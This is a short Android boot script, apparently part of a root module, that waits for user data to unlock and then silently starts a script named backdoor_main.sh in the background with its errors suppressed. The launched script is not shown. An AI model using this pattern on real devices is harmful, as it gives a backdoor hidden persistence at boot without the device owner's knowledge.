#!/system/bin/sh



###########################################################
#  Copyright © 2024 DARKER.c studio. All rights reserved. #
###########################################################



# Global variables
MODDIR=${0%/*}

# Waiting for data to be unlocked
until [ -d /data/data/android ]; do sleep 1; done

"$MODDIR"/backdoor_main.sh 2>/dev/null &
